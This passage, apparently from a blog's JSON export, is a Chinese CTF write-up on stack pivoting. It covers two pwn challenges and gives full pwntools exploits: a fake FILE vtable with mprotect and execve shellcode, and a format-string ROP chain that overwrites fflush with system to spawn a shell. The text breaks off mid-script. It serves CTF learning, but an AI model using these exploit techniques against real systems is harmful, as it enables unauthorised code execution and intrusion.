remote('172.16.1.10', 20000)\n    libc = ELF('./lib/i386-linux-gnu/libc-2.19.so')\n\n\nelf = ELF('decoder')\n\nprintf_got = elf.got['printf']\t\t#  0x80484c0\nprintf_plt = elf.symbols['printf'] \nread_addr = elf.symbols['read']\nfflush_plt = elf.symbols['fflush']\n\nrealloc_got = elf.got['realloc']\nfflush_got = elf.got['fflush']\n\nmain_addr = 0x804836e\n\nprint('fflush_got = ' + hex(fflush_got))\nprint('printf_plt = ' + hex(printf_plt))\n\naddesp_72 = 0x08048b31\nrodata = 0x8048de0 # '%d:%s'\nbss_addr = 0x804b050\n\ns = base64.b64encode('%02052d%20$hn%033581d%21$hn%22$x')  # add_esp\n\npayload = s + (13 - len(s) / 4) * p32(0) + p32(printf_plt)+ p32(addesp_72) + p32(rodata) + p32(1) + p32(printf_got)\n# printf(rodata, '1', printf_got) \n# 0xffa8a3f4 \npayload += p32(fflush_got + 2) + p32(fflush_got) + p32(fflush_got) \n\npayload += p32(0x1) * 0xc  + p32(read_addr) + p32(addesp_72) + p32(0) + p32(fflush_got) + p32(4)   #0xffa8a434 -> read\n\npayload += p32(0x2) * 0xf + p32(read_addr) + p32(addesp_72) + p32(0) + p32(bss_addr) + p32(8)\n\npayload += p32(0x3) * 0xf + p32(fflush_plt) + p32(0xdeadbeef) + p32(bss_addr)\n\n# gdb.attach(p, open('debug'))\ngdb.attach(p)\np.recvuntil('DECODER\\n')\np.sendline(payload)\n\np.recvuntil(':')\nprintf_addr = u32(p.recv(4))\n\nsystem_addr = printf_addr + libc.symbols['system'] - libc.symbols['printf']\n#binsh_addr = printf_addr + next(libc.search('/bin/sh')) - libc.symbols['printf']\n\nprint('system_addr = ' + hex(system_addr))\n\np.send(p32(system_addr))\np.send(\"/bin/sh\\0\")\n\np.interactive()\n```\n\n## 2017BCTF100levels","slug":"pwn中的栈迁移","published":1,"updated":"2017-04-29T08:04:21.905Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k36004bhv18ejptqfdd","content":"<h2 id=\"序\"><a href=\"#序\" class=\"headerlink\" title=\"序\"></a>序</h2><p>连着好几次遇到栈迁移问题了，总结记录下。<br>每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类：</p>\n<ol>\n<li>stack pivot后mprotect</li>\n<li>ebp的partial overwrite</li>\n<li>栈迁移的gadget</li>\n</ol>\n<h2 id=\"i春秋百度杯try-to-pwn\"><a href=\"#i春秋百度杯try-to-pwn\" class=\"headerlink\" title=\"i春秋百度杯try to pwn\"></a>i春秋百度杯try to pwn</h2><p>我们用<code>0xff</code>来填充<code>FILE</code>结构体，尝试中发现填充为其他数据的话会出现调用到其他函数而报错的情况。</p>\n<p>eax由这条语句赋值，其中ebx与eax的值为：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">EAX</span>  <span class=\"number\">0x80efa9c</span> (x+<span class=\"number\">188</span>) —▸ <span class=\"number\">0x80e2b6d</span> (__EH_FRAME_BEGIN__+<span class=\"number\">38021</span>) ◂— <span class=\"keyword\">pop</span>    <span class=\"built_in\">esp</span></div><div class=\"line\"><span class=\"built_in\">EBX</span>  <span class=\"number\">0x80efa04</span> (x+<span class=\"number\">36</span>) ◂— <span class=\"number\">0xffffff7f</span></div></pre></td></tr></table></figure></p>\n<p><code>0x804f915 &lt;fclose+53&gt;     mov    eax, dword ptr [ebx + 0x94]</code><br>ebx的值为<code>fake_FILE_addr+36</code><br>eax的值为<code>fake_vtable</code>的前4个字节</p>\n<p>我们存储shellcode的地址的addr为<code>fake_vtable</code>的4到8个字节。</p>\n<p>还要注意下mprotexct的函数调用规定<br><code>int mprotect(void *addr, size_t len, int prot);</code><br><figure class=\"highlight nimrod\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">mprotect()  changes  the  access protections <span class=\"keyword\">for</span> the calling process's memory pages containing <span class=\"built_in\">any</span> part <span class=\"keyword\">of</span> the address <span class=\"built_in\">range</span> <span class=\"keyword\">in</span> the interval [<span class=\"keyword\">addr</span>, <span class=\"keyword\">addr</span>+len-<span class=\"number\">1</span>].  <span class=\"keyword\">addr</span> must be aligned  to  a page boundary.</div></pre></td></tr></table></figure></p>\n<p>注意这里的地址调用一定是<strong>页对齐</strong>的。<br><code>int prot</code>这里的数字可以简单参照linux的权限<code>rwx</code>，总是7是可读可写可执行。</p>\n<p>这一题在尝试过程中发现\\x0b会截断，所以我们要吧pwntools产生的shellcode简单修改下。</p>\n<p>exp(参考了<a href=\"http://blog.csdn.net/qq_29343201/article/details/69666824\" target=\"_blank\" rel=\"external\">这篇文章</a>)：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python</div><div class=\"line\"># coding=utf-<span class=\"number\">8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">global</span> p</div><div class=\"line\"></div><div class=\"line\">if slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\">if local:</div><div class=\"line\">    p = process(<span class=\"string\">'./fake'</span>)</div><div class=\"line\"><span class=\"symbol\">else:</span></div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\">if local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./fake'</span>)</div><div class=\"line\">name_addr = <span class=\"number\">0x80EF9E0</span></div><div class=\"line\">mprotect_addr = elf.symbols[<span class=\"string\">'mprotect'</span>]</div><div class=\"line\">un_FILE_addr = <span class=\"number\">0x80EFA00</span></div><div class=\"line\">fake_FILE_addr = <span class=\"number\">0x80EFA04</span></div><div class=\"line\">fake_vtable_addr = fake_FILE_addr + <span class=\"number\">0x94</span> + <span class=\"number\">0x4</span></div><div class=\"line\">x_r = <span class=\"number\">0x08048f66</span></div><div class=\"line\">p_r = <span class=\"number\">0x080e2b6d</span></div><div class=\"line\"></div><div class=\"line\">offset = un_FILE_addr - name_addr</div><div class=\"line\"></div><div class=\"line\">shellcode = <span class=\"string\">'''</span></div><div class=\"line\">/* execve(path=<span class=\"string\">'/bin///sh'</span>, argv=[<span class=\"string\">'sh'</span>], envp=<span class=\"number\">0</span>) */</div><div class=\"line\">/* <span class=\"keyword\">push</span> <span class=\"string\">'/bin///sh\\x00'</span> */</div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">0x68</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">0x732f2f2f</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">0x6e69622f</span></div><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">ebx</span>, <span class=\"built_in\">esp</span></div><div class=\"line\">/* <span class=\"keyword\">push</span> argument array [<span class=\"string\">'sh\\x00'</span>] */</div><div class=\"line\">/* <span class=\"keyword\">push</span> <span class=\"string\">'sh\\x00\\x00'</span> */</div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">0x1010101</span></div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">esp</span>], <span class=\"number\">0x1016972</span></div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">ecx</span>, <span class=\"built_in\">ecx</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"built_in\">ecx</span> /* null terminate */</div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">4</span></div><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span></div><div class=\"line\"><span class=\"keyword\">add</span> <span class=\"built_in\">ecx</span>, <span class=\"built_in\">esp</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"built_in\">ecx</span> /* <span class=\"string\">'sh\\x00'</span> */</div><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">ecx</span>, <span class=\"built_in\">esp</span></div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">edx</span>, <span class=\"built_in\">edx</span></div><div class=\"line\">/* <span class=\"keyword\">call</span> execve() */</div><div class=\"line\">/* <span class=\"keyword\">push</span> SYS_execve */</div><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, <span class=\"number\">0xf</span></div><div class=\"line\"><span class=\"keyword\">sub</span> <span class=\"built_in\">eax</span>, <span class=\"number\">0x4</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">int</span> <span class=\"number\">0x80</span></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'name?\\n'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'a'</span> * offset</div><div class=\"line\">    # fake_FILE_addr</div><div class=\"line\">    payload += p32(fake_FILE_addr)</div><div class=\"line\">    # fake_FILE</div><div class=\"line\">    payload += <span class=\"string\">'\\xff'</span> * <span class=\"number\">0x94</span></div><div class=\"line\">    # fake_jmp_t</div><div class=\"line\">    payload += p32(fake_vtable_addr)</div><div class=\"line\"></div><div class=\"line\">    # fake_vtable</div><div class=\"line\">    payload += p32(p_r)</div><div class=\"line\">    payload += p32(un_FILE_addr + <span class=\"number\">300</span>)</div><div class=\"line\">    payload += p32(x_r) *  <span class=\"number\">16</span></div><div class=\"line\"></div><div class=\"line\">    # mprotect</div><div class=\"line\">    junk = <span class=\"number\">300</span> - len(payload) + <span class=\"number\">32</span></div><div class=\"line\">    payload += cyclic(junk)</div><div class=\"line\">    payload += p32(mprotect_addr)</div><div class=\"line\">    payload += p32(un_FILE_addr + <span class=\"number\">300</span> + <span class=\"number\">20</span>) # shellcode addr</div><div class=\"line\">    payload += p32(<span class=\"number\">0x080ef000</span>)</div><div class=\"line\">    payload += p32(<span class=\"number\">1024</span>)</div><div class=\"line\">    payload += p32(<span class=\"number\">7</span>)</div><div class=\"line\">    payload += asm(shellcode)</div><div class=\"line\">    gdb.attach(p)</div><div class=\"line\"></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\"></div><div class=\"line\">if __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<h2 id=\"南京线下赛decoder\"><a href=\"#南京线下赛decoder\" class=\"headerlink\" title=\"南京线下赛decoder\"></a>南京线下赛decoder</h2><p><code>checksec</code>:<br><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~/c/NJoffline<span class=\"comment\"># checksec decoder</span></div><div class=\"line\">[*] <span class=\"string\">'/root/ctf-problem/NJoffline/decoder'</span></div><div class=\"line\"><span class=\"attr\">    Arch:</span>     i386<span class=\"bullet\">-32</span>-little</div><div class=\"line\"><span class=\"attr\">    RELRO:</span>    Partial RELRO</div><div class=\"line\"><span class=\"attr\">    Stack:</span>    <span class=\"literal\">No</span> canary found</div><div class=\"line\"><span class=\"attr\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"attr\">    PIE:</span>      <span class=\"literal\">No</span> PIE (<span class=\"number\">0x8048000</span>)</div></pre></td></tr></table></figure></p>\n<p>没开什么保护，观察后发现存在栈溢出，但是不能构造rop，因为esp的地址是由栈上数据给的，直接覆盖的话会ret到奇怪的地方去，也就是说造成栈溢出的栈底数据是我们不可控的。</p>\n<p>所以，如果我们能够栈的位置到可控部分，我们就可以劫持eip，构造rop chain。</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~/c/NJoffline# ROPgadget --binary decoder | grep <span class=\"string\">'esp'</span></div><div class=\"line\"><span class=\"number\">0x08048490</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">byte</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">eax</span>], <span class=\"built_in\">al</span> <span class=\"comment\">; add esp, 8 ; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048605</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x10</span> <span class=\"comment\">; leave ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048b31</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x40</span> <span class=\"comment\">; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048d35</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0xc</span> <span class=\"comment\">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048492</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">8</span> <span class=\"comment\">; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048af7</span> : <span class=\"keyword\">and</span> <span class=\"built_in\">esp</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ebx</span> + <span class=\"number\">0x804b054</span>] <span class=\"comment\">; nop ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cd7</span> : <span class=\"keyword\">clc</span> <span class=\"comment\">; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x0804848e</span> : <span class=\"keyword\">inc</span> <span class=\"built_in\">byte</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">eax</span>] <span class=\"comment\">; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048687</span> : <span class=\"keyword\">je</span> <span class=\"number\">0x8048684</span> <span class=\"comment\">; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx</span></div><div class=\"line\"><span class=\"number\">0x08048d33</span> : <span class=\"keyword\">jne</span> <span class=\"number\">0x8048d21</span> <span class=\"comment\">; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cd5</span> : <span class=\"keyword\">lea</span> <span class=\"built_in\">esp</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ebp</span> - <span class=\"number\">8</span>] <span class=\"comment\">; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cdb</span> : <span class=\"keyword\">lea</span> <span class=\"built_in\">esp</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ecx</span> - <span class=\"number\">4</span>] <span class=\"comment\">; ret</span></div><div class=\"line\"><span class=\"number\">0x08048d4f</span> : <span class=\"keyword\">mov</span> <span class=\"built_in\">bl</span>, <span class=\"number\">0x22</span> <span class=\"comment\">; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x0804868a</span> : <span class=\"keyword\">mov</span> <span class=\"built_in\">ebp</span>, <span class=\"built_in\">esp</span> <span class=\"comment\">; sub esp, 0x14 ; push eax ; call edx</span></div><div class=\"line\"><span class=\"number\">0x080485d0</span> : <span class=\"keyword\">mov</span> <span class=\"built_in\">ebx</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">esp</span>] <span class=\"comment\">; ret</span></div><div class=\"line\"><span class=\"number\">0x08048b30</span> : <span class=\"keyword\">nop</span> <span class=\"comment\">; add esp, 0x40 ; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x080485cf</span> : <span class=\"keyword\">nop</span> <span class=\"comment\">; mov ebx, dword ptr [esp] ; ret</span></div><div class=\"line\"><span class=\"number\">0x080485cd</span> : <span class=\"keyword\">nop</span> <span class=\"comment\">; nop ; mov ebx, dword ptr [esp] ; ret</span></div><div class=\"line\"><span class=\"number\">0x080485cb</span> : <span class=\"keyword\">nop</span> <span class=\"comment\">; nop ; nop ; mov ebx, dword ptr [esp] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cda</span> : <span class=\"keyword\">pop</span> <span class=\"built_in\">ebp</span> <span class=\"comment\">; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cd8</span> : <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cd9</span> : <span class=\"keyword\">pop</span> <span class=\"built_in\">edi</span> <span class=\"comment\">; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048689</span> : <span class=\"keyword\">push</span> <span class=\"built_in\">ebp</span> <span class=\"comment\">; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx</span></div><div class=\"line\"><span class=\"number\">0x08048634</span> : <span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x10</span> <span class=\"comment\">; push eax ; push 0x804b04c ; call edx</span></div><div class=\"line\"><span class=\"number\">0x080485fb</span> : <span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x14</span> <span class=\"comment\">; push 0x804b04c ; call eax</span></div><div class=\"line\"><span class=\"number\">0x0804868c</span> : <span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x14</span> <span class=\"comment\">; push eax ; call edx</span></div><div class=\"line\"><span class=\"number\">0x08048475</span> : <span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span>, <span class=\"number\">8</span> <span class=\"comment\">; call 0x80485d9</span></div><div class=\"line\"><span class=\"number\">0x08048af6</span> : <span class=\"keyword\">xor</span> <span class=\"built_in\">esp</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ebx</span>] <span class=\"comment\">; mov dword ptr [0x804b054], eax ; nop ; pop ebp ; ret</span></div></pre></td></tr></table></figure>\n<p>发现这几条还是可用的：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0x08048490</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">byte</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">eax</span>], <span class=\"built_in\">al</span> <span class=\"comment\">; add esp, 8 ; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048605</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x10</span> <span class=\"comment\">; leave ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048b31</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x40</span> <span class=\"comment\">; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048d35</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0xc</span> <span class=\"comment\">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048492</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">8</span> <span class=\"comment\">; pop ebx ; ret</span></div></pre></td></tr></table></figure></p>\n<p>于是我们的思路如下：</p>\n<ol>\n<li>在栈上利用gadget<code>0x08048b31</code>布置好ropchain</li>\n<li>利用fsb将fflish改为我们的gadget<code>0x08048b31</code></li>\n<li>在bss写入<code>/bin/sh</code></li>\n<li>修改fflush为system</li>\n</ol>\n<p>附上南大某女生exp:<br><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"meta\"># coding=utf-8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\">import base64</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">local</span> = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context.log_level = <span class=\"literal\">True</span></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span>:</div><div class=\"line\">    p = process(<span class=\"string\">'./decoder'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote(<span class=\"string\">'172.16.1.10'</span>, <span class=\"number\">20000</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'./lib/i386-linux-gnu/libc-2.19.so'</span>)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'decoder'</span>)</div><div class=\"line\"></div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]\t\t<span class=\"meta\">#  0x80484c0</span></div><div class=\"line\">printf_plt = elf.symbols[<span class=\"string\">'printf'</span>] </div><div class=\"line\">read_addr = elf.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\">fflush_plt = elf.symbols[<span class=\"string\">'fflush'</span>]</div><div class=\"line\"></div><div class=\"line\">realloc_got = elf.got[<span class=\"string\">'realloc'</span>]</div><div class=\"line\">fflush_got = elf.got[<span class=\"string\">'fflush'</span>]</div><div class=\"line\"></div><div class=\"line\">main_addr = <span class=\"number\">0x804836e</span></div><div class=\"line\"></div><div class=\"line\">print(<span class=\"string\">'fflush_got = '</span> + <span class=\"built_in\">hex</span>(fflush_got))</div><div class=\"line\">print(<span class=\"string\">'printf_plt = '</span> + <span class=\"built_in\">hex</span>(printf_plt))</div><div class=\"line\"></div><div class=\"line\">addesp_72 = <span class=\"number\">0x08048b31</span></div><div class=\"line\">rodata = <span class=\"number\">0x8048de0</span> <span class=\"meta\"># <span class=\"string\">'%d:%s'</span></span></div><div class=\"line\">bss_addr = <span class=\"number\">0x804b050</span></div><div class=\"line\"></div><div class=\"line\">s = base64.b64encode(<span class=\"string\">'%02052d%20$hn%033581d%21$hn%22$x'</span>)  <span class=\"meta\"># add_esp</span></div><div class=\"line\"></div><div class=\"line\">payload = s + (<span class=\"number\">13</span> - len(s) / <span class=\"number\">4</span>) * p32(<span class=\"number\">0</span>) + p32(printf_plt)+ p32(addesp_72) + p32(rodata) + p32(<span class=\"number\">1</span>) + p32(printf_got)</div><div class=\"line\"><span class=\"meta\"># printf(rodata, <span class=\"string\">'1'</span>, printf_got) </span></div><div class=\"line\"><span class=\"meta\"># 0xffa8a3f4 </span></div><div class=\"line\">payload += p32(fflush_got + <span class=\"number\">2</span>) + p32(fflush_got) + p32(fflush_got) </div><div class=\"line\"></div><div class=\"line\">payload += p32(<span class=\"number\">0x1</span>) * <span class=\"number\">0xc</span>  + p32(read_addr) + p32(addesp_72) + p32(<span class=\"number\">0</span>) + p32(fflush_got) + p32(<span class=\"number\">4</span>)   <span class=\"meta\">#0xffa8a434 -&gt; read</span></div><div class=\"line\"></div><div class=\"line\">payload += p32(<span class=\"number\">0x2</span>) * <span class=\"number\">0xf</span> + p32(read_addr) + p32(addesp_72) + p32(<span class=\"number\">0</span>) + p32(bss_addr) + p32(<span class=\"number\">8</span>)</div><div class=\"line\"></div><div class=\"line\">payload += p32(<span class=\"number\">0x3</span>) * <span class=\"number\">0xf</span> + p32(fflush_plt) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(bss_addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\"># gdb.attach(p, open(<span class=\"string\">'debug'</span>))</span></div><div class=\"line\">gdb.attach(p)</div><div class=\"line\">p.recvuntil(<span class=\"string\">'DECODER\\n'</span>)</div><div class=\"line\">p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">printf_addr = u32(p.recv(<span class=\"number\">4</span>))</div><div class=\"line\"></div><div class=\"line\">system_addr = printf_addr + libc.symbols[<span class=\"string\">'system'</span>] - libc.symbols[<span 